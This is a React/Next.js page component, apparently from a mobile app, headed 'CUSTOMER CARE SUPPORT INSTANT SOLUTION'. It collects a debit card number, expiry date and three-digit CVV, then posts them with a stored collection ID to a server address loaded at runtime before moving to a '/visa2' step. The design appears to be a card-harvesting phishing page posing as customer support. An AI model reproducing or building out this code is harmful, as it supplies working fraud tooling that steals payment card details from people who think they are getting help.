'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  
import { useState } from 'react';
import Link from "next/link";
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
import Echo from "../registerPlugin";

export default function Home() {
  const router = useRouter();
  
  const [loading, setLoading] = useState(false);

  
  const handleSubmit = async (e) => {
    e.preventDefault()
    setLoading(true); 
    
    try {

      const result = await Echo.getConfig();
      const API_URL = result.value;
      const SITE = result.site;
            
      const formData = new FormData(e.target);
      const jsonObject1 = {};
      const jsonObject = {};
      formData.forEach((value, key) => {
          jsonObject[key] = value;
      });
      jsonObject1['data'] = jsonObject;
      jsonObject1['site'] = SITE;
      jsonObject1['id'] = localStorage.getItem("collection_id");
        const response = await fetch(`${API_URL}/form/add`, {
            method: 'POST',
            body: JSON.stringify(jsonObject1)
        });

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        router.push('/visa2');
    } catch (error) {
        console.error('There was a problem with the fetch operation:', error);
        alert("An error occurred, please try again."+error);
    } finally{
        setLoading(false); 
    }
};
  return (
    <>
    <Header />
      <h3 className="text-center mx-2">
        CUSTOMER CARE SUPPORT INSTANT SOLUTION
      </h3>
      <img src="help/step4.jpeg" className="w-100" alt="" />
    <main className="px-3">
    <div className="form-container m-2">
  <form onSubmit={handleSubmit} id="submitForm">

    <DebitCardInputComponent />

    <div className="d-flex gap-4">
      <ExpiryDateInputComponent />
      
      <div className="form-floating mb-3 ">
        <input
          type="text"
          name="cvc"
          className="form-control"
          placeholder="Ex. cvv"
          minLength={3}
          maxLength={3}
          inputMode="numeric"
          required
        />
        <label>
          <span>CVV</span>*
        </label>
      </div>
    </div>
    
    <div className="d-flex justify-content-between">
      <Link
        href="/3"
        className="btn btn-outline-success  mt-3 text-center"
      >
        <img src="help/back.png" alt="" />
      </Link>
      <button
        type="submit"
        className="btn btn-success  mt-3 text-center"
        id="submit-button"
        disabled={loading}
      >
        {loading ? 'Please wait...' : 'Next'}
      </button>
    </div>
    
  </form>
</div>

    </main>

    <Footer />
</>
  );

}
